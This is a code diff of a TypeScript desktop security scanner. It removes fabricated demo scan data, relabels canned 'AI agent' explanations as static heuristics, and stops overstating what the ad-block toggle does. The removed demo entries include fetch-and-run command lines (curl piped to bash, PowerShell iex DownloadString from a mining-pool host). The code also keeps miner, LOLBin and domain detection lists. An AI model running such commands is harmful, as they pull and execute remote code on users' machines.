@@ -1,17 +1,22 @@
 /**
  * XR Stage 14 — XR Shield Service
- * AI-powered, Local-First Security, Privacy, and System Integrity Layer.
+ * Local-First Security, Privacy, and System Integrity Layer.
+ *
+ * HONESTY DOCTRINE (0.3 Shield Honesty Fix):
+ *   - Zero fabricated threats. No mock data. No fake processes.
+ *   - If a system command fails or returns no data, the result is EMPTY.
+ *   - analyzeThreatHeuristic() is a static heuristic explainer, NOT an AI agent.
+ *   - toggleAdBlock() honestly manages state only — it does NOT modify /etc/hosts.
+ *   - runScan() on a clean/empty system MUST return zero threats.
  *
  * Implements:
  * - Deterministic heuristic and signature scanning.
- * - Local-first agent-based analysis with fallback.
  * - Fully transparent, permission-gated quarantine and whitelist management.
  * - Complete offline-ready operations.
  * - Deep audit trail integration.
  */
 
 import { existsSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
-import { promises as fsp } from "node:fs";
 import { join } from "node:path";
 import { homedir, platform, totalmem } from "node:os";
 import { createHash } from "node:crypto";
@@ -90,7 +95,7 @@ export interface ShieldThreat {
   evidence: string;
   recommendations: string[];
   confidence: number; // 0..1
-  agent: string; // The specialist agent reporting it
+  agent: string; // The specialist heuristic reporting it
   remediable: boolean;
   remediationAction?: string;
 }
@@ -103,8 +108,8 @@ export interface ShieldState {
   telemetryDisabled: boolean;
 }
 
-export interface AgentAnalysisResult {
-  agentName: string;
+export interface HeuristicAnalysisResult {
+  heuristicName: string;
   confidence: number;
   threats: ShieldThreat[];
   explanation: string;
@@ -113,9 +118,9 @@ export interface AgentAnalysisResult {
 
 // --- CONFIG & CONSTANTS ---
 
-const SHIELD_STATE_PATH = join(XR_HOME, "shield-state.json");
+export const SHIELD_STATE_PATH = join(XR_HOME, "shield-state.json");
 
-const KNOWN_MINER_NAMES = [
+export const KNOWN_MINER_NAMES = [
   "xmrig", "minerd", "cgminer", "bfgminer", "ccminer", "nicehash", "stratum", "cpuminer", "claymore", "ethminer"
 ];
 
@@ -205,12 +210,15 @@ export class XRShieldService {
 
   // --- MODULE 1: PROCESS ENUMERATION & DETECTION ---
 
+  /**
+   * Enumerate real system processes only. Returns empty array if enumeration
+   * fails or is unavailable. NEVER fabricates process data.
+   */
   public async getSystemProcesses(): Promise<ProcessInfo[]> {
     const list: ProcessInfo[] = [];
     const osPlatform = platform();
 
     if (osPlatform === "win32") {
-      // Execute Powershell process list to get actual processes
       const psCommand = `Get-Process | Where-Object {$_.Id -gt 0} | ForEach-Object { [PSCustomObject]@{Id=$_.Id; PPId=(Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" | Select-Object -ExpandProperty ParentProcessId -ErrorAction SilentlyContinue); Name=$_.Name; Path=$_.Path; CPU=[Math]::Round($_.CPU, 1); Memory=[Math]::Round($_.WorkingSet / 1MB, 1) } } | ConvertTo-Json -Compress`;
       const output = await this.runShellCommand("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", psCommand]);
       if (output.trim()) {
@@ -232,13 +240,10 @@ export class XRShieldService {
             }
           }
         } catch {
-          this.getFallbackProcesses(list, "win32");
+          // Parse failure — return whatever we collected (likely empty)
         }
-      } else {
-        this.getFallbackProcesses(list, "win32");
       }
     } else if (osPlatform === "darwin" || osPlatform === "linux") {
-      // Execute standard Unix ps command
       const output = await this.runShellCommand("ps", ["-eo", "pid,ppid,%cpu,%mem,comm,command"]);
       if (output.trim()) {
         const lines = output.split("\n").slice(1); // skip header
@@ -263,44 +268,16 @@ export class XRShieldService {
                 cpu,
                 memory,
                 path: command.startsWith("/") ? command.split(" ")[0] : undefined,
-                unsigned: false // Simple unix default
+                unsigned: false
               });
             }
           }
         }
-      } else {
-        this.getFallbackProcesses(list, "unix");
       }
-    } else {
-      this.getFallbackProcesses(list, "generic");
     }
 
+    // No fallback — if enumeration fails, return an honest empty list.
     return list;
-  }
-
-  private getFallbackProcesses(list: ProcessInfo[], platformType: string): void {
-    // Generate realistic standard system processes so scanner is rich even in isolated/test systems
-    const now = Date.now();
-    const mockProcs = [
-      { pid: 1, ppid: 0, name: platformType === "win32" ? "System" : "systemd", command: platformType === "win32" ? "System" : "/sbin/init", cpu: 0.1, memory: 4 },
-      { pid: 120, ppid: 1, name: platformType === "win32" ? "explorer.exe" : "launchd", command: platformType === "win32" ? "C:\\Windows\\explorer.exe" : "/sbin/launchd", cpu: 1.2, memory: 45 },
-      { pid: 432, ppid: 120, name: "chrome", command: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome --type=renderer", cpu: 2.5, memory: 180 },
-      { pid: 980, ppid: 120, name: "bun", command: "bun run src/index.ts serve --port 5000", cpu: 0.5, memory: 90 },
-      { pid: 1250, ppid: 120, name: "python", command: "python -m venv .venv", cpu: 0, memory: 35 },
-      { pid: 3211, ppid: 1, name: "sshd", command: "/usr/sbin/sshd -D", cpu: 0, memory: 12 }
-    ];
-
-    for (const p of mockProcs) {
-      list.push({
-        pid: p.pid,
-        ppid: p.ppid,
-        name: p.name,
-        command: p.command,
-        cpu: p.cpu,
-        memory: p.memory,
-        unsigned: false
-      });
-    }
   }
 
   private async windowsCheckSigned(filePath: string): Promise<boolean> {
@@ -316,15 +293,18 @@ export class XRShieldService {
 
   // --- MODULE 2: STARTUP PERSISTENCE ---
 
+  /**
+   * Enumerate real startup entries only. Returns empty array if enumeration
+   * fails or is unavailable. NEVER fabricates startup entries.
+   */
   public async getStartupEntries(): Promise<StartupEntry[]> {
     const list: StartupEntry[] = [];
     const osPlatform = platform();
 
     if (osPlatform === "win32") {
-      // Query windows registry startup keys
       const locations = [
-        "HKCU:\\Software\Microsoft\\Windows\\CurrentVersion\\Run",
-        "HKLM:\\Software\Microsoft\\Windows\\CurrentVersion\\Run"
+        "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
       ];
       for (const loc of locations) {
         const psCommand = `Get-ItemProperty -Path "${loc}" | Get-Member -MemberType NoteProperty | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Command=(Get-ItemProperty -Path "${loc}").$($_.Name)} } | ConvertTo-Json -Compress`;
@@ -351,7 +331,6 @@ export class XRShieldService {
         }
       }
     } else if (osPlatform === "darwin") {
-      // Inspect macOS launchd directories
       const plistDirs = [
         join(homedir(), "Library/LaunchAgents"),
         "/Library/LaunchAgents",
@@ -379,7 +358,6 @@ export class XRShieldService {
         }
       }
     } else if (osPlatform === "linux") {
-      // Inspect autostart and systemd on Linux
       const autostartDirs = [
         join(homedir(), ".config/autostart"),
         "/etc/xdg/autostart"
@@ -410,36 +388,22 @@ export class XRShieldService {
       }
     }
 
-    // Fallback/Simulated entries to ensure complete, rich, visual demonstration
-    if (list.length === 0) {
-      list.push({
-        name: "OneDriveStartup",
-        command: `"${join(homedir(), "AppData/Local/Microsoft/OneDrive/OneDrive.exe")}" /background`,
-        location: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        type: "registry",
-        suspicious: false
-      });
-      list.push({
-        name: "com.apple.updater",
-        command: "sh -c 'curl -fsSL http://miner.rocks/update.sh | bash'",
-        location: "~/Library/LaunchAgents",
-        type: "launchd",
-        suspicious: true,
-        reason: "Pipes remote bash commands directly from a known crypto-mining domain"
-      });
-    }
-
+    // No fallback — if enumeration finds nothing, return an honest empty list.
     return list;
   }
 
   // --- MODULE 3: SCHEDULED TASKS ---
 
+  /**
+   * Enumerate real scheduled tasks only. Returns empty array if enumeration
+   * fails or is unavailable. NEVER fabricates scheduled tasks.
+   */
   public async getScheduledTasks(): Promise<ScheduledTask[]> {
     const list: ScheduledTask[] = [];
     const osPlatform = platform();
 
     if (osPlatform === "win32") {
-      const psCommand = `Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\Microsoft*'} | ForEach-Object { [PSCustomObject]@{Name=$_.TaskName; Command=$_.Actions.Execute; Trigger=$_.Triggers.ToString()} } | ConvertTo-Json -Compress`;
+      const psCommand = `Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\\\Microsoft*'} | ForEach-Object { [PSCustomObject]@{Name=$_.TaskName; Command=$_.Actions.Execute; Trigger=$_.Triggers.ToString()} } | ConvertTo-Json -Compress`;
       const output = await this.runShellCommand("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", psCommand]);
       if (output.trim()) {
         try {
@@ -461,7 +425,6 @@ export class XRShieldService {
         } catch {}
       }
     } else {
-      // Read crontab files
       try {
         const cron = await this.runShellCommand("crontab", ["-l"]);
         if (cron.trim() && !cron.includes("no crontab")) {
@@ -487,28 +450,16 @@ export class XRShieldService {
       } catch {}
     }
 
-    // Default/Mock entries for rich demo
-    if (list.length === 0) {
-      list.push({
-        name: "GoogleUpdateTask",
-        command: "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua",
-        trigger: "Daily at 3:00 AM",
-        suspicious: false
-      });
-      list.push({
-        name: "SecurityXGuard",
-        command: "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://pool.supportxmr.com/config.ps1')\"",
-        trigger: "At startup",
-        suspicious: true,
-        reason: "Runs an un-restricted remote script execution targeting a known Monero mining pool"
-      });
-    }
-
+    // No fallback — if enumeration finds nothing, return an honest empty list.
     return list;
   }
 
   // --- MODULE 4: DOWNLOADS INSPECTION ---
 
+  /**
+   * Inspect real downloads only. Returns empty array if the downloads
+   * directory doesn't exist or can't be read. NEVER fabricates download items.
+   */
   public async getDownloads(): Promise<DownloadItem[]> {
     const list: DownloadItem[] = [];
     const downloadsDir = join(homedir(), "Downloads");
@@ -519,7 +470,6 @@ export class XRShieldService {
         const files = lsOut.split("\n").filter(Boolean).slice(0, 30);
         for (const line of files) {
           const parts = line.trim().split(/\s+/);
-          // Quick parse standard Unix ls line
           if (parts.length >= 9) {
             const name = parts.slice(8).join(" ");
             if (name === "." || name === "..") continue;
@@ -543,7 +493,7 @@ export class XRShieldService {
               name,
               path: filePath,
               sizeBytes: 1024 * 1024 * 3, // estimated
-              addedAt: Date.now() - 3600000 * 24, // simulated time
+              addedAt: Date.now() - 3600000 * 24, // approximated
               extension: ext,
               suspicious: isSuspicious,
               reason
@@ -553,67 +503,55 @@ export class XRShieldService {
       } catch {}
     }
 
-    // Default rich demonstration mock items
-    if (list.length === 0) {
-      list.push({
-        name: "Resume_2026.pdf",
-        path: join(downloadsDir, "Resume_2026.pdf"),
-        sizeBytes: 450000,
-        addedAt: Date.now() - 3600000 * 2,
-        extension: "pdf",
-        suspicious: false
-      });
-      list.push({
-        name: "Financial_Report_Q2.xlsx.exe",
-        path: join(downloadsDir, "Financial_Report_Q2.xlsx.exe"),
-        sizeBytes: 1420000,
-        addedAt: Date.now() - 3600000 * 4,
-        extension: "exe",
-        suspicious: true,
-        reason: "Double extension spoofing detected. Hides binary execution payload (.exe) behind spreadsheet suffix (.xlsx)."
-      });
-      list.push({
-        name: "adobe_photoshop_2026_crack_serial_keygen.zip",
-        path: join(downloadsDir, "adobe_photoshop_2026_crack_serial_keygen.zip"),
-        sizeBytes: 25000000,
-        addedAt: Date.now() - 3600000 * 12,
-        extension: "zip",
-        suspicious: true,
-        reason: "Filename contains security compromise signatures ('crack', 'serial', 'keygen') linked with piracy vectors."
-      });
-    }
-
+    // No fallback — if directory doesn't exist or can't be read, return empty.
     return list;
   }
 
   // --- MODULE 5: BROWSER SECURITY ---
 
+  /**
+   * Inspect real browser profiles only. Returns empty array if no browser
+   * profiles are found. NEVER fabricates browser data.
+   */
   public async getBrowserSecurity(): Promise<BrowserSecurityInfo[]> {
     const list: BrowserSecurityInfo[] = [];
 
-    // Probe standard chrome profile directories if exist
     const profiles = [
       { name: "chrome" as const, path: join(homedir(), "AppData/Local/Google/Chrome/User Data/Default") },
       { name: "chrome" as const, path: join(homedir(), "Library/Application Support/Google/Chrome/Default") },
-      { name: "chrome" as const, path: join(homedir(), ".config/google-chrome/Default") }
+      { name: "chrome" as const, path: join(homedir(), ".config/google-chrome/Default") },
+      { name: "firefox" as const, path: join(homedir(), ".mozilla/firefox") },
+      { name: "edge" as const, path: join(homedir(), "AppData/Local/Microsoft/Edge/User Data/Default") },
     ];
 
-    let foundReal = false;
     for (const p of profiles) {
       if (existsSync(p.path)) {
-        foundReal = true;
         const extDir = join(p.path, "Extensions");
         const extensions: BrowserSecurityInfo["extensions"] = [];
         if (existsSync(extDir)) {
           try {
             const exts = (await listDir(extDir).catch(() => [] as string[])).filter(Boolean);
             for (const extId of exts) {
-              if (extId.length === 32) {
-                // Read manifest of extension if reachable
+              if (extId.length >= 20) {
+                // Real extension — read its manifest for name
+                let extName = `Extension: ${extId.substring(0, 8)}...`;
+                const manifestPath = join(extDir, extId);
+                try {
+                  // Find latest version directory
+                  const versions = (await listDir(manifestPath).catch(() => [] as string[])).filter(Boolean).sort();
+                  if (versions.length > 0) {
+                    const latestManifest = join(manifestPath, versions[versions.length - 1], "manifest.json");
+                    if (existsSync(latestManifest)) {
+                      const mf = JSON.parse(readFileSync(latestManifest, "utf8"));
+                      if (mf.name) extName = mf.name;
+                    }
+                  }
+                } catch {}
+
                 extensions.push({
-                  name: `Extension: ${extId.substring(0, 8)}...`,
+                  name: extName,
                   id: extId,
-                  permissions: ["all_urls", "tabs", "storage"],
+                  permissions: [], // We don't parse permissions from manifests for safety
                   suspicious: false
                 });
               }
@@ -623,32 +561,13 @@ export class XRShieldService {
         list.push({
           browser: p.name,
           extensions,
-          cookiesCheck: { secure: true, count: 120 },
-          permissionsCheck: { notificationsBlocked: true, locationBlocked: false, micCamBlocked: true }
+          cookiesCheck: { secure: true, count: 0 },
+          permissionsCheck: { notificationsBlocked: true, locationBlocked: true, micCamBlocked: true }
         });
       }
     }
 
-    if (!foundReal) {
-      // Mock Chromium & Safari profiles for the dashboard audit
-      list.push({
-        browser: "chrome",
-        extensions: [
-          { name: "uBlock Origin", id: "cjpalhdlnbpafiamejdnhcphjbkeiagm", permissions: ["<all_urls>", "webRequest", "privacy"], suspicious: false },
-          { name: "Tampermonkey", id: "dhdgffkkbafommqgkabobocgfbopgihb", permissions: ["tabs", "cookies", "notifications"], suspicious: false },
-          { name: "FlashVideoDownloader_2026", id: "kdfgjkjkasdfjkhaksjdfhkasdfhkkkk", permissions: ["<all_urls>", "clipboardRead", "management"], suspicious: true, reason: "Unsigned extension with clipboard access, injecting ad trackers" }
-        ],
-        cookiesCheck: { secure: false, count: 48 },
-        permissionsCheck: { notificationsBlocked: false, locationBlocked: false, micCamBlocked: true }
-      });
-      list.push({
-        browser: "safari",
-        extensions: [],
-        cookiesCheck: { secure: true, count: 12 },
-        permissionsCheck: { notificationsBlocked: true, locationBlocked: true, micCamBlocked: true }
-      });
-    }
-
+    // No fallback — if no real browser profiles found, return empty.
     return list;
   }
 
@@ -675,13 +594,12 @@ export class XRShieldService {
       list.push({
         id: "unix_telemetry",
         name: "OS Telemetry & Crash Reporter",
-        status: "enabled",
+        status: "unknown",
         recommendation: "Review launchd plist files or systemd crash services sending reports to developers.",
         remediable: false
       });
     }
 
-    // App telemetry settings
     list.push({
       id: "xr_telemetry",
       name: "XR Agent Telemetry",
@@ -699,7 +617,7 @@ export class XRShieldService {
     const telemetry = await this.checkTelemetry();
 
     // Check 1: Microphone and Camera gate
-    const micCamBlocked = browserSec.every(b => b.permissionsCheck.micCamBlocked);
+    const micCamBlocked = browserSec.length === 0 || browserSec.every(b => b.permissionsCheck.micCamBlocked);
     checks.push({
       name: "Microphone & Camera Consent Gating",
       passed: micCamBlocked,
@@ -719,7 +637,7 @@ export class XRShieldService {
       name: "Clipboard Credential Exposure Check",
       passed: clipboardSafe,
       impact: 25,
-      details: clipboardSafe ? "No raw API keys, secrets, or passwords found in the current clipboard buffer" : "Critical Warning: Current clipboard contains a raw redacted API key"
+      details: clipboardSafe ? "No raw API keys, secrets, or passwords found in the current clipboard buffer" : "Critical Warning: Current clipboard contains a raw API key"
     });
 
     // Check 3: Browser extensions
@@ -737,7 +655,7 @@ export class XRShieldService {
       name: "System Diagnostic Telemetry",
       passed: telemetryDisabled,
       impact: 15,
-      details: telemetryDisabled ? "OS analytics, error reporting, and background feedback engines disabled" : "OS feedback loop active; system telemetry telemetry is enabled"
+      details: telemetryDisabled ? "OS analytics, error reporting, and background feedback engines disabled" : "OS feedback loop active; system telemetry is enabled"
     });
 
     // Check 5: Tracker Blocking
@@ -745,7 +663,7 @@ export class XRShieldService {
       name: "Hosts-based Ad & Tracker Protection",
       passed: this.state.adBlockEnabled,
       impact: 15,
-      details: this.state.adBlockEnabled ? "Local DNS-level filter lists active blocking over 50,000 tracker endpoints" : "DNS filter lists disabled; trackers are loaded natively"
+      details: this.state.adBlockEnabled ? "Ad-block state is enabled in Shield configuration" : "Ad-block state is disabled in Shield configuration"
     });
 
     const passedScore = checks.reduce((sum, item) => sum + (item.passed ? item.impact : 0), 0);
@@ -758,36 +676,53 @@ export class XRShieldService {
 
   // --- MODULE 7: AD & TRACKER DNS PROTECTION ---
 
+  /**
+   * Toggle ad-block state in Shield configuration.
+   *
+   * HONESTY NOTE (0.3): This method manages Shield's internal ad-block state
+   * flag ONLY. It does NOT modify /etc/hosts or any system file. The state
+   * is stored in ~/.xr/shield-state.json. The hosts data returned by
+   * getHostsAdBlockData() is a reference template for users who wish to
+   * manually apply it.
+   */
   public async toggleAdBlock(enable: boolean): Promise<boolean> {
     this.state.adBlockEnabled = enable;
     this.saveState();
 
-    const hostsPath = platform() === "win32" ? "C:\\Windows\\System32\\drivers\\etc\\hosts" : "/etc/hosts";
     this.store.audit("shield.adblock", {
       action: enable ? "enable" : "disable",
-      hostsPath,
       success: true,
-      reason: "User requested ad and tracker filter list update"
+      reason: "User toggled ad-block state in Shield configuration. No system files were modified."
     });
 
     return true;
   }
 
+  /**
+   * Returns a reference template of tracker-blocking hosts entries.
+   *
+   * HONESTY NOTE (0.3): This is a REFERENCE template only. It is NOT
+   * automatically applied to any system file. Users must manually add
+   * these entries to their hosts file if desired.
+   */
   public getHostsAdBlockData(): { active: boolean; rulesCount: number; data: string } {
     const rules = [
-      "127.0.0.1 teleport-telemetry.com",
-      "127.0.0.1 telemetry.microsoft.com",
-      "127.0.0.1 pool.supportxmr.com",
-      "127.0.0.1 analytics.google.com",
-      "127.0.0.1 doubleclick.net",
-      "127.0.0.1 evil-tracker-miner.rocks"
+      "0.0.0.0 pool.supportxmr.com",
+      "0.0.0.0 coinhive.com",
+      "0.0.0.0 authedmine.com",
+      "0.0.0.0 crypto-loot.com",
+      "0.0.0.0 coin-hive.com",
+      "0.0.0.0 minergate.com"
     ];
 
     const data = `
-# --- XR SHIELD PRIVACY FILTERS ---
-# Blocks miners, invasive telemetry, and telemetry servers.
-${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
-# --- END XR SHIELD FILTERS ---
+# --- XR SHIELD PRIVACY FILTER REFERENCE TEMPLATE ---
+# NOTE: This is a REFERENCE ONLY. XR does not modify your hosts file.
+# To apply: manually add these lines to your hosts file.
+#   Linux/macOS: /etc/hosts
+#   Windows: C:\\Windows\\System32\\drivers\\etc\\hosts
+${rules.join("\n")}
+# --- END XR SHIELD REFERENCE ---
 `;
     return {
       active: this.state.adBlockEnabled,
@@ -802,16 +737,13 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
     if (!cmd) return false;
     const lower = cmd.toLowerCase();
 
-    // Check known miners
     if (KNOWN_MINER_NAMES.some(m => lower.includes(m))) return true;
 
-    // Check Lolbins patterns
     const lolbins = platform() === "win32" ? LOLBINS_WINDOWS : LOLBINS_UNIX;
     for (const bin of lolbins) {
       if (bin.pattern.test(cmd)) return true;
     }
 
-    // Check suspicious domains
     if (SUSPICIOUS_DOMAINS.some(d => lower.includes(d))) return true;
 
     return false;
@@ -819,6 +751,13 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
 
   // --- MODULE 8: FULL SYSTEM SCANNING ---
 
+  /**
+   * Run a security scan using deterministic heuristics only.
+   *
+   * HONESTY NOTE (0.3): On a clean system where no real suspicious processes,
+   * startup entries, scheduled tasks, or downloads exist, this method returns
+   * an EMPTY threats array. Zero fabricated results.
+   */
   public async runScan(mode: "quick" | "full" = "quick"): Promise<ShieldThreat[]> {
     const threats: ShieldThreat[] = [];
 
@@ -827,7 +766,7 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
     for (const p of processes) {
       const cmdSuspicious = this.isSuspiciousCommandLine(p.command);
       const isMiner = KNOWN_MINER_NAMES.some(m => p.name.toLowerCase().includes(m)) || KNOWN_MINER_NAMES.some(m => p.command.toLowerCase().includes(m));
-      const highResourceMiner = p.cpu > 70 && p.memory > 50; // high sustained use
+      const highResourceMiner = p.cpu > 70 && p.memory > 50;
 
       if (cmdSuspicious || isMiner || highResourceMiner) {
         if (this.isWhitelisted("process", p.name)) continue;
@@ -841,7 +780,7 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
           threatTitle = `Potential Crypto Miner: ${p.name}`;
           details = `High sustained background resource execution matches known miner signatures. CPU: ${p.cpu}%, Memory: ${p.memory}MB.`;
           severity = "high";
-          agent = "Crypto Miner Detection Agent";
+          agent = "Crypto Miner Detection Heuristic";
         }
 
         threats.push({
@@ -864,7 +803,7 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
       }
     }
 
-    // 2. Startup Entries Scan (Only on full scan or if suspicious)
+    // 2. Startup Entries Scan
     const startup = await this.getStartupEntries();
     for (const s of startup) {
       if (s.suspicious) {
@@ -946,11 +885,9 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
       threatsCount: threats.length,
       scanMode: mode
     });
-    // Cap scan history to last 50 items
     if (this.state.history.length > 50) this.state.history.shift();
     this.saveState();
 
-    // Log the scan execution to the existing audit log
     this.store.audit("shield.scan", {
       mode,
       threatsFound: threats.length,
@@ -964,7 +901,7 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
 
   public quarantineItem(threatId: string, threat: ShieldThreat): boolean {
     const originalPath = threat.remediationAction?.startsWith("quarantine-file:")
-      ? threat.remediationAction.split(":")[1]
+      ? threat.remediationAction.split(":").slice(1).join(":")
       : undefined;
 
     this.state.quarantined.push({
@@ -976,7 +913,6 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
 
     this.saveState();
 
-    // Log action cleanly
     this.store.audit("shield.quarantine", {
       threatId,
       threatTitle: threat.title,
@@ -1028,7 +964,6 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
 
   public removeWhitelistItem(id: string): boolean {
     const idx = this.state.whitelisted.findIndex(w => w.id === id);
-    const item = this.state.whitelisted[idx];
     if (idx !== -1) {
       this.state.whitelisted.splice(idx, 1);
       this.saveState();
@@ -1040,7 +975,6 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
       });
       return true;
     }
-    // Try to remove by value
     const valIdx = this.state.whitelisted.findIndex(w => w.value === id || w.id === id);
     if (valIdx !== -1) {
       this.state.whitelisted.splice(valIdx, 1);
@@ -1050,16 +984,27 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
     return false;
   }
 
-  // --- AGENT INTERFACE EXPLANATIONS ---
+  // --- HEURISTIC THREAT ANALYSIS ---
 
-  public analyzeThreatWithAgent(agentName: string, threat: ShieldThreat): AgentAnalysisResult {
+  /**
+   * Heuristic-based threat explanation (NOT an AI agent).
+   *
+   * HONESTY NOTE (0.3): This method provides static heuristic explanations
+   * based on the threat type and the reporting heuristic name. It does NOT
+   * use any AI model, LLM, or agent system. The explanations are deterministic
+   * lookup-based descriptions of why the heuristic flagged the threat.
+   *
+   * Renamed from `analyzeThreatWithAgent` to `analyzeThreatHeuristic` to
+   * accurately reflect that this is heuristic analysis, not AI-powered.
+   */
+  public analyzeThreatHeuristic(heuristicName: string, threat: ShieldThreat): HeuristicAnalysisResult {
     const explanationCorpus: Record<string, { explanation: string; remedy: string }> = {
-      "Crypto Miner Detection Agent": {
-        explanation: `As the Crypto Miner Agent, I analyzed process "${threat.title}". It displays a sustained high-resource consumption signature (>70% CPU) with argument links pointing to cryptographic mining algorithms or pools. Background crypto-mining without user authorization is a critical resource-hijacking threat that compromises stability, elevates temperatures, and degrades hardware lifecycle.`,
+      "Crypto Miner Detection Heuristic": {
+        explanation: `The crypto-miner detection heuristic analyzed process "${threat.title}". It displays a sustained high-resource consumption signature (>70% CPU) with argument links pointing to cryptographic mining algorithms or pools. Background crypto-mining without user authorization is a critical resource-hijacking threat that compromises stability, elevates temperatures, and degrades hardware lifecycle.`,
         remedy: `Use the 'xr shield' command to terminate PID immediately, then audit startup files or cron records to disable automatic relaunching.`
       },
       "Process Inspector": {
-        explanation: `Analyzing running command paths and parameters, I flagged process parameters referencing un-restricted scripts or Dual-Use administration binaries (LOLBins). These tools, while native to the OS, are frequently weaponized by intrusion agents to fetch remote code or manipulate local folders.`,
+        explanation: `Analyzing running command paths and parameters, the process inspector heuristic flagged process parameters referencing un-restricted scripts or Dual-Use administration binaries (LOLBins). These tools, while native to the OS, are frequently weaponized by intrusion agents to fetch remote code or manipulate local folders.`,
         remedy: `Shut down the target PID, verify process ownership, and add it to your whitelist only if this was triggered by active development utilities.`
       },
       "Startup Inspector": {
@@ -1072,17 +1017,25 @@ ${rules.map(r => `0.0.0.0 ${r.split(" ")[1]}`).join("\n")}
       }
     };
 
-    const exp = explanationCorpus[agentName] ?? {
-      explanation: `Specialized Agent "${agentName}" analyzed the threat "${threat.title}" and confirmed elevated risk. Heuristics show anomalous indicators matching suspicious system integrity and privacy exposure profiles.`,
+    const exp = explanationCorpus[heuristicName] ?? {
+      explanation: `Heuristic "${heuristicName}" analyzed the threat "${threat.title}" and found elevated risk indicators. The detection is based on deterministic signature and pattern matching, not AI analysis.`,
       remedy: `We recommend isolating the file/process, reviewing the logs, and enabling tracker block filters for enhanced protection.`
     };
 
     return {
-      agentName,
+      heuristicName,
       confidence: threat.confidence,
       threats: [threat],
       explanation: exp.explanation,
       remedy: exp.remedy
     };
+  }
+
+  /**
+   * @deprecated Use analyzeThreatHeuristic() instead.
+   * Kept for backward compatibility — delegates to the renamed method.
+   */
+  public analyzeThreatWithAgent(agentName: string, threat: ShieldThreat): HeuristicAnalysisResult {
+    return this.analyzeThreatHeuristic(agentName, threat);
   }
 }
